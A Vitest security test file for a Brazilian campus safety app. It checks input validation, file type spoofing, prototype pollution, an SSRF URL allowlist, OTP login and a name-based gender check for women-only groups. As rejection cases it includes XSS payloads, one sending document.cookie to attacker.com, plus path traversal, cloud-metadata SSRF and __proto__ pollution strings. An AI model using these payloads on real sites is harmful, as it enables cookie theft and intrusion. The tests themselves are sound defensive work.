import { describe, it, expect, beforeEach } from 'vitest';
import {
  isValidCpf,
  isValidUfscEmail,
  maskCpf,
  GovBrAuthSchema,
  UfscEmailSchema,
  QrCodeInputSchema,
  LightRatingSchema,
  ReportSubmissionSchema,
  ChatMessageSchema,
  PersistedCampusStateSchema,
} from '../security/schemas';
import {
  clearOtpChallenges,
  sendUfscOtpCode,
  verifyUfscOtpCode,
  DEMO_OTP_CODE,
  DEMO_UFSC_EMAIL,
} from '../services/ufscOtpAuth';
import {
  canUseWomenOnlyGroups,
  classifyIdentityGender,
  extractEmailFirstName,
  isMemberEligibleForWomenOnly,
} from '../security/genderGuard';
import {
  defaultStripExifCanvas,
  validateEvidenceImage,
} from '../security/fileValidation';
import { loadCampusState, saveCampusState } from '../security/storage';
import { getSeedCampusState } from '../data/ufscTrindade';
import { assertSafeFetchUrl, isAllowedFetchUrl } from '../utils/network';

describe('Security & DevSecOps Validation Layer', () => {
  describe('Zod Input Schemas & XSS Prevention', () => {
    it('rejects XSS vectors in ReportSubmissionSchema (<script>, <img>, javascript:)', () => {
      const maliciousReports = [
        {
          category: 'iluminacao',
          location: 'Entrada CCE',
          description: '<script>alert("pwned")</script>',
          isConfidential: true,
        },
        {
          category: 'assedio',
          location: '<img src=x onerror=alert(1)>',
          description: 'Relato legítimo mas com local malicioso',
          isConfidential: true,
        },
        {
          category: 'suspeito',
          location: 'Bosque',
          description: 'Acesse javascript:alert(document.cookie) para detalhes',
          isConfidential: false,
        },
        {
          category: 'manutencao',
          location: 'RU Central',
          description: 'data:text/html,<script>alert(1)</script>',
          isConfidential: true,
        },
      ];

      for (const payload of maliciousReports) {
        const result = ReportSubmissionSchema.safeParse(payload);
        expect(result.success).toBe(false);
      }
    });

    it('rejects XSS vectors in ChatMessageSchema', () => {
      const maliciousChat = [
        {
          senderId: 'usr-1',
          senderName: 'Pedro',
          text: '<script>fetch("https://attacker.com?c="+document.cookie)</script>',
        },
        {
          senderId: 'usr-2',
          senderName: '<script>alert(1)</script>',
          text: 'Oi, estou chegando perto do RU',
        },
        {
          senderId: 'usr-3',
          senderName: 'Ana',
          text: 'Clique aqui: javascript:alert(1)',
        },
      ];

      for (const msg of maliciousChat) {
        const result = ChatMessageSchema.safeParse(msg);
        expect(result.success).toBe(false);
      }
    });

    it('rejects oversized inputs (>500 chars report, >240 chars chat) and too short inputs', () => {
      const oversizedReport = {
        category: 'iluminacao',
        location: 'Biblioteca Universitária',
        description: 'A'.repeat(501),
        isConfidential: true,
      };
      expect(ReportSubmissionSchema.safeParse(oversizedReport).success).toBe(false);

      const tooShortReport = {
        category: 'iluminacao',
        location: 'BU',
        description: 'curto', // < 10 chars
        isConfidential: true,
      };
      expect(ReportSubmissionSchema.safeParse(tooShortReport).success).toBe(false);

      const oversizedChat = {
        senderId: 'usr-1',
        senderName: 'Carlos',
        text: 'C'.repeat(241),
      };
      expect(ChatMessageSchema.safeParse(oversizedChat).success).toBe(false);

      const emptyChat = {
        senderId: 'usr-1',
        senderName: 'Carlos',
        text: '   ',
      };
      expect(ChatMessageSchema.safeParse(emptyChat).success).toBe(false);
    });

    it('validates and rejects malformed QR codes (directory traversal, special chars)', () => {
      const malformedCodes = [
        '../etc/passwd',
        'POSTE-!@#$',
        'POSTE/CCE/01',
        '<script>alert(1)</script>',
        'POSTE',
        '',
      ];

      for (const code of malformedCodes) {
        expect(QrCodeInputSchema.safeParse(code).success).toBe(false);
        expect(QrCodeInputSchema.safeParse({ code }).success).toBe(false);
      }

      // Valid codes
      const validCodes = ['POSTE-BU-01', 'POSTE-RU-03', 'POSTE-BOSQUE-04'];
      for (const code of validCodes) {
        expect(QrCodeInputSchema.safeParse(code).success).toBe(true);
        expect(QrCodeInputSchema.safeParse({ code }).success).toBe(true);
      }
    });

    it('validates corridor light rating in [1..5] integer range', () => {
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 5 }).success).toBe(true);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 1 }).success).toBe(true);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 0 }).success).toBe(false);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 6 }).success).toBe(false);
      expect(LightRatingSchema.safeParse({ edgeId: 'edge-1', rating: 3.5 }).success).toBe(false);
    });
  });

  describe('CPF Validation & Masking', () => {
    it('rejects invalid Brazilian CPFs (repeated digits, bad check digits, invalid format)', () => {
      const invalidCpfs = [
        '111.111.111-11',
        '000.000.000-00',
        '22222222222',
        '123.456.789-00', // wrong check digits
        '12345678901', // wrong check digits
        '123456789', // 9 digits
        'abc.def.ghi-jk',
        '',
      ];

      for (const cpf of invalidCpfs) {
        expect(isValidCpf(cpf)).toBe(false);
      }
    });

    it('accepts valid Brazilian CPF and masks to ***.XXX.XXX-**', () => {
      // Valid check-digit CPF: 529.982.247-25
      const validCpf1 = '529.982.247-25';
      expect(isValidCpf(validCpf1)).toBe(true);
      expect(maskCpf(validCpf1)).toBe('***.982.247-**');

      // Valid check-digit CPF: 123.456.789-09
      const validCpf2 = '12345678909';
      expect(isValidCpf(validCpf2)).toBe(true);
      expect(maskCpf(validCpf2)).toBe('***.456.789-**');

      // GovBrAuthSchema validation
      const authPayload = {
        name: 'Mariana Silva',
        cpf: '529.982.247-25',
        affiliation: 'Estudante • Eng. Sanitária',
      };
      expect(GovBrAuthSchema.safeParse(authPayload).success).toBe(true);

      const invalidAuthPayload = {
        name: '<script>alert(1)</script>',
        cpf: '111.111.111-11',
        affiliation: 'Estudante',
      };
      expect(GovBrAuthSchema.safeParse(invalidAuthPayload).success).toBe(false);
    });
  });

  describe('File Validation (Magic Bytes & EXIF Stripping)', () => {
    it('rejects oversized files (> 5 MB)', async () => {
      // 5MB + 1 byte
      const oversizedBytes = new Uint8Array(5 * 1024 * 1024 + 1);
      // Valid JPEG header
      oversizedBytes[0] = 0xff;
      oversizedBytes[1] = 0xd8;
      oversizedBytes[2] = 0xff;

      const file = new File([oversizedBytes], 'photo.jpg', { type: 'image/jpeg' });
      const result = await validateEvidenceImage(file);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/5MB/i);
    });

    it('rejects spoofed files (.exe disguised as .jpg via Magic Bytes check)', async () => {
      // DOS MZ header: 0x4D 0x5A
      const exeBytes = new Uint8Array([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
      const file = new File([exeBytes], 'malware.jpg', { type: 'image/jpeg' });

      const result = await validateEvidenceImage(file);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/magic bytes|inválido/i);
    });

    it('rejects spoofed HTML/SVG disguised as .jpg', async () => {
      const htmlBytes = new TextEncoder().encode('<svg onload=alert(1)>');
      const file = new File([htmlBytes], 'evidence.jpg', { type: 'image/jpeg' });

      const result = await validateEvidenceImage(file);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/magic bytes|inválido/i);
    });

    it('accepts valid JPEG, PNG and WEBP files with authentic Magic Bytes', async () => {
      // JPEG: FF D8 FF E0
      const jpegBytes = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      const jpegFile = new File([jpegBytes], 'valid.jpg', { type: 'image/jpeg' });
      const mockStrip = async (_f: File) => 'data:image/jpeg;base64,mockthumb';

      const jpegResult = await validateEvidenceImage(jpegFile, mockStrip);
      expect(jpegResult.valid).toBe(true);
      expect(jpegResult.mimeType).toBe('image/jpeg');
      expect(jpegResult.sanitizedDataUrl).toBe('data:image/jpeg;base64,mockthumb');

      // PNG: 89 50 4E 47 0D 0A 1A 0A
      const pngBytes = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
      const pngFile = new File([pngBytes], 'valid.png', { type: 'image/png' });
      const pngResult = await validateEvidenceImage(pngFile, mockStrip);
      expect(pngResult.valid).toBe(true);
      expect(pngResult.mimeType).toBe('image/png');

      // WEBP: RIFF....WEBP (52 49 46 46 ... 57 45 42 50)
      const webpBytes = new Uint8Array([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x24, 0x00, 0x00, 0x00, // length
        0x57, 0x45, 0x42, 0x50, // WEBP
        0x56, 0x50, 0x38, 0x20, // VP8
      ]);
      const webpFile = new File([webpBytes], 'valid.webp', { type: 'image/webp' });
      const webpResult = await validateEvidenceImage(webpFile, mockStrip);
      expect(webpResult.valid).toBe(true);
      expect(webpResult.mimeType).toBe('image/webp');
    });

    it('produces WebP sanitized data URL by default and falls back to JPEG when canvas returns PNG', async () => {
      const jpegBytes = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      const jpegFile = new File([jpegBytes], 'valid.jpg', { type: 'image/jpeg' });

      // Default JSDOM headless path returns data:image/webp;base64,mockthumb
      const defaultResult = await validateEvidenceImage(jpegFile);
      expect(defaultResult.valid).toBe(true);
      expect(defaultResult.sanitizedDataUrl).toBe('data:image/webp;base64,mockthumb');

      // Browser canvas supporting 2D context: falls back to JPEG if webp encodes as PNG
      const originalGetContext = HTMLCanvasElement.prototype.getContext;
      const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
      const originalCreateObjectURL = URL.createObjectURL;
      const originalRevokeObjectURL = URL.revokeObjectURL;
      const OriginalImage = globalThis.Image;

      try {
        HTMLCanvasElement.prototype.getContext = (() => ({
          drawImage: () => {},
        })) as unknown as typeof HTMLCanvasElement.prototype.getContext;
        HTMLCanvasElement.prototype.toDataURL = ((mime?: string) =>
          mime === 'image/webp'
            ? 'data:image/png;base64,iVBORw0KGgo='
            : 'data:image/jpeg;base64,/9j/4AAQSkZJRg==') as typeof HTMLCanvasElement.prototype.toDataURL;
        URL.createObjectURL = () => 'blob:mock-image';
        URL.revokeObjectURL = () => {};

        class MockImage {
          width = 800;
          height = 600;
          onload: (() => void) | null = null;
          onerror: (() => void) | null = null;
          set src(_val: string) {
            queueMicrotask(() => this.onload?.());
          }
        }
        globalThis.Image = MockImage as unknown as typeof Image;

        const fallbackUrl = await defaultStripExifCanvas(jpegFile);
        expect(fallbackUrl).toBe('data:image/jpeg;base64,/9j/4AAQSkZJRg==');

        // When browser supports WebP canvas encoding, returns image/webp directly
        HTMLCanvasElement.prototype.toDataURL = ((mime?: string) =>
          mime === 'image/webp'
            ? 'data:image/webp;base64,UklGRh4AAABXRUJQ'
            : 'data:image/jpeg;base64,/9j/4AAQSkZJRg==') as typeof HTMLCanvasElement.prototype.toDataURL;

        const webpUrl = await defaultStripExifCanvas(jpegFile);
        expect(webpUrl).toBe('data:image/webp;base64,UklGRh4AAABXRUJQ');
      } finally {
        HTMLCanvasElement.prototype.getContext = originalGetContext;
        HTMLCanvasElement.prototype.toDataURL = originalToDataURL;
        URL.createObjectURL = originalCreateObjectURL;
        URL.revokeObjectURL = originalRevokeObjectURL;
        globalThis.Image = OriginalImage;
      }
    });
  });

  describe('Storage Resilience & Prototype Pollution Defense', () => {
    let mockStorage: Storage;
    let storageMap: Map<string, string>;

    beforeEach(() => {
      storageMap = new Map();
      mockStorage = {
        length: 0,
        clear: () => storageMap.clear(),
        getItem: (k: string) => storageMap.get(k) ?? null,
        setItem: (k: string, v: string) => {
          storageMap.set(k, v);
        },
        removeItem: (k: string) => {
          storageMap.delete(k);
        },
        key: (i: number) => Array.from(storageMap.keys())[i] ?? null,
      };
    });

    it('safely returns seed state when localStorage contains malformed JSON', () => {
      mockStorage.setItem('rua_escura_campus_state_v1', '{invalid-json-data');
      const state = loadCampusState(mockStorage);
      expect(state).toBeDefined();
      expect(state.posts.length).toBe(12);
      expect(state.selectedBuildings.length).toBeGreaterThan(0);
    });

    it('safely returns seed state when localStorage contains invalid schema shape', () => {
      mockStorage.setItem(
        'rua_escura_campus_state_v1',
        JSON.stringify({ unexpectedKey: 'corrupted', version: 'not-a-number' })
      );
      const state = loadCampusState(mockStorage);
      expect(state).toBeDefined();
      expect(state.posts.length).toBe(12);
    });

    it('handles image decoding failures cleanly in validateEvidenceImage', async () => {
      const jpegBytes = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46]);
      const jpegFile = new File([jpegBytes], 'corrupt.jpg', { type: 'image/jpeg' });
      const failingStrip = async () => {
        throw new Error('Falha ao decodificar imagem para remoção de EXIF.');
      };

      const result = await validateEvidenceImage(jpegFile, failingStrip);
      expect(result.valid).toBe(false);
      expect(result.error).toMatch(/falha ao decodificar/i);
    });

    it('safely rejects prototype pollution attempts in localStorage while allowing legitimate "prototype" values', () => {
      // 1. Legitimate user message with "prototype" in text
      const state = getSeedCampusState();
      state.chatMessages['comp-1'] = [
        {
          id: 'msg-proto-1',
          senderId: 'usr-1',
          senderName: 'Pedro',
          text: 'Estamos testando o prototype do projeto de engenharia',
          timestamp: new Date().toISOString(),
        },
      ];

      expect(saveCampusState(state, mockStorage)).toBe(true);
      const reloaded = loadCampusState(mockStorage);
      expect(reloaded.chatMessages['comp-1'][0].text).toContain('prototype');

      // 2. Real serialized prototype pollution payload even inside otherwise-valid campus state
      const fullValidJson = JSON.stringify(getSeedCampusState());
      const pollutedJson = fullValidJson.replace('{', '{"__proto__": {"isAdmin": true}, ');
      mockStorage.setItem('rua_escura_campus_state_v1', pollutedJson);
      const pollutedState = loadCampusState(mockStorage);
      expect(pollutedState).toBeDefined();
      expect((Object.prototype as Record<string, unknown>).isAdmin).toBeUndefined();
      expect(pollutedState.posts.length).toBe(12); // Rejected by reviver and falls back safely to seed

      // 3. Oversized (> 2 MB) localStorage payload fallback
      mockStorage.setItem('rua_escura_campus_state_v1', 'x'.repeat(2 * 1024 * 1024 + 10));
      const oversizedFallback = loadCampusState(mockStorage);
      expect(oversizedFallback.posts.length).toBe(12);
    });

    it('rejects tampered localStorage containing XSS vectors in reports or chat messages (Hydration XSS Defense)', () => {
      // State tampered with <script> inside report description
      const tamperedReportState = getSeedCampusState();
      tamperedReportState.reports[0].description = '<script>alert("storage-xss")</script>';

      mockStorage.setItem('rua_escura_campus_state_v1', JSON.stringify(tamperedReportState));
      const stateAfterReportTamper = loadCampusState(mockStorage);
      // Fails hydration validation and safely returns clean seed
      expect(stateAfterReportTamper.reports[0].description).not.toContain('<script>');
      expect(stateAfterReportTamper.reports[0].id).toBe('rep-init-1');

      // State tampered with XSS inside chat message
      const tamperedChatState = getSeedCampusState();
      tamperedChatState.chatMessages['comp-1'] = [
        {
          id: 'msg-xss-1',
          senderId: 'attacker',
          senderName: '<img src=x onerror=alert(1)>',
          text: 'javascript:alert(1)',
          timestamp: new Date().toISOString(),
        },
      ];

      mockStorage.setItem('rua_escura_campus_state_v1', JSON.stringify(tamperedChatState));
      const stateAfterChatTamper = loadCampusState(mockStorage);
      expect(stateAfterChatTamper.chatMessages['comp-1'][0].text).not.toContain('javascript:');
    });

    it('successfully saves and loads valid campus state', () => {
      const seed = getSeedCampusState();
      expect(PersistedCampusStateSchema.safeParse(seed).success).toBe(true);
      seed.onboardingCompleted = true;
      seed.isNightMap = true;

      const saveSuccess = saveCampusState(seed, mockStorage);
      expect(saveSuccess).toBe(true);

      const loaded = loadCampusState(mockStorage);
      expect(loaded.onboardingCompleted).toBe(true);
      expect(loaded.isNightMap).toBe(true);
    });

    it('handles storage quota errors gracefully during save', () => {
      const quotaStorage: Storage = {
        ...mockStorage,
        setItem: () => {
          throw new Error('QuotaExceededError: DOM Exception 22');
        },
      };

      const seed = getSeedCampusState();
      const saveSuccess = saveCampusState(seed, quotaStorage);
      expect(saveSuccess).toBe(false); // Does not throw, returns false
    });

    it('accepts WebP/JPEG/PNG thumbnail URIs and rejects SVG/HTML in ReportSubmissionSchema', () => {
      const invalidThumbnails = [
        'data:image/svg+xml;base64,PHN2Zy8+',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'javascript:alert(1)',
      ];
      for (const badThumb of invalidThumbnails) {
        const result = ReportSubmissionSchema.safeParse({
          category: 'iluminacao',
          location: 'Bosque UFSC',
          description: 'Poste apagado perto da entrada do Bosque.',
          isConfidential: true,
          photoThumbnailUrl: badThumb,
        });
        expect(result.success).toBe(false);
      }

      const validThumbnails = [
        'data:image/webp;base64,UklGRh4AAABXRUJQ',
        'data:image/jpeg;base64,/9j/4AAQSkZJRg==',
        'data:image/png;base64,iVBORw0KGgo=',
      ];
      for (const goodThumb of validThumbnails) {
        const result = ReportSubmissionSchema.safeParse({
          category: 'iluminacao',
          location: 'Bosque UFSC',
          description: 'Poste apagado perto da entrada do Bosque.',
          isConfidential: true,
          photoThumbnailUrl: goodThumb,
        });
        expect(result.success).toBe(true);
      }
    });
  });

  describe('Zero-Trust Network URL Allowlist (SSRF & Protocol Defense)', () => {
    it('allows only allowlisted HTTPS tile hosts and same-origin paths while blocking SSRF/HTTP/XSS', () => {
      expect(isAllowedFetchUrl('https://tile.openstreetmap.org/16/1/2.png')).toBe(true);
      expect(isAllowedFetchUrl('https://a.tile.openstreetmap.org/16/1/2.png')).toBe(true);
      expect(isAllowedFetchUrl('https://b.tile.openstreetmap.org/16/1/2.png')).toBe(true);
      expect(isAllowedFetchUrl('https://c.tile.openstreetmap.org/16/1/2.png')).toBe(true);
      expect(isAllowedFetchUrl('https://server.arcgisonline.com/ArcGIS/rest/services')).toBe(true);
      expect(isAllowedFetchUrl('/assets/campus.json')).toBe(true);

      const blocked = [
        'http://169.254.169.254/latest/meta-data/',
        'https://169.254.169.254/latest/meta-data/',
        'http://127.0.0.1:3000/',
        'https://192.168.0.1/router',
        'http://tile.openstreetmap.org/16/1/2.png',
        'https://user:pass@tile.openstreetmap.org/16/1/2.png',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '//attacker.example.com/payload',
        'https://attacker.example.com/tile.openstreetmap.org',
      ];

      for (const url of blocked) {
        expect(isAllowedFetchUrl(url)).toBe(false);
        expect(() => assertSafeFetchUrl(url)).toThrow();
      }
    });
  });

  describe('UFSC Institutional Email Validation & OTP Sandbox Auth', () => {
    it('accepts @ufsc.br subdomains only and verifies OTP challenges fail-fast', async () => {
      clearOtpChallenges();

      expect(isValidUfscEmail('mariana.silva@grad.ufsc.br')).toBe(true);
      expect(isValidUfscEmail('docente@ufsc.br')).toBe(true);
      expect(isValidUfscEmail('pesquisa@posgrad.ufsc.br')).toBe(true);
      expect(isValidUfscEmail('aluno@gmail.com')).toBe(false);
      expect(isValidUfscEmail('<script>@ufsc.br')).toBe(false);
      expect(UfscEmailSchema.safeParse('externo@hotmail.com').success).toBe(false);

      const challenge = await sendUfscOtpCode(DEMO_UFSC_EMAIL);
      expect(challenge.mode).toBe('sandbox');
      expect(challenge.devCodeHint).toBe(DEMO_OTP_CODE);

      await expect(verifyUfscOtpCode(DEMO_UFSC_EMAIL, '0000')).rejects.toThrow(/Código incorreto/i);

      const verified = await verifyUfscOtpCode(DEMO_UFSC_EMAIL, DEMO_OTP_CODE);
      expect(verified).toEqual({
        verified: true,
        mode: 'sandbox',
        email: DEMO_UFSC_EMAIL,
      });

      // Consumed challenge cannot be replayed
      await expect(verifyUfscOtpCode(DEMO_UFSC_EMAIL, DEMO_OTP_CODE)).rejects.toThrow(/expirado/i);
    });
  });

  describe('Women-Only Email Gender Guard (genderGuard)', () => {
    it('prioritizes institutional @ufsc.br email over display name and excludes male names cleanly', () => {
      expect(extractEmailFirstName('pedro.ramos@grad.ufsc.br')).toBe('pedro');
      expect(extractEmailFirstName('joao_silva@ufsc.br')).toBe('joao');
      expect(extractEmailFirstName('ana.oliveira@posgrad.ufsc.br')).toBe('ana');

      // Even if a male user fakes display name as "Mariana", male email blocks women-only access
      const spoofedMaleSession = {
        name: 'Mariana Fake',
        cpfMasked: '***.111.222-**',
        affiliation: 'CTC UFSC',
        ufscEmail: 'pedro.ramos@grad.ufsc.br',
        verifiedAt: new Date().toISOString(),
      };
      expect(classifyIdentityGender(spoofedMaleSession.ufscEmail, spoofedMaleSession.name).gender).toBe('male');
      expect(canUseWomenOnlyGroups(spoofedMaleSession)).toBe(false);

      const maleSession = {
        name: 'João Silva',
        cpfMasked: '***.111.222-**',
        affiliation: 'CTC UFSC',
        ufscEmail: 'joao.silva@ufsc.br',
        verifiedAt: new Date().toISOString(),
      };
      expect(canUseWomenOnlyGroups(maleSession)).toBe(false);

      const femaleSession = {
        name: 'Mariana Silva',
        cpfMasked: '***.982.247-**',
        affiliation: 'CTC UFSC',
        ufscEmail: 'mariana.silva@grad.ufsc.br',
        verifiedAt: new Date().toISOString(),
      };
      expect(canUseWomenOnlyGroups(femaleSession)).toBe(true);

      // Member list filtering excludes male email accounts automatically
      expect(isMemberEligibleForWomenOnly({ name: 'Mariana', ufscEmail: 'mariana.silva@grad.ufsc.br' })).toBe(true);
      expect(isMemberEligibleForWomenOnly({ name: 'Lucas', ufscEmail: 'lucas.becker@grad.ufsc.br' })).toBe(false);
      expect(isMemberEligibleForWomenOnly({ name: 'Maria', ufscEmail: 'pedro.henrique@ufsc.br' })).toBe(false);
    });
  });
});
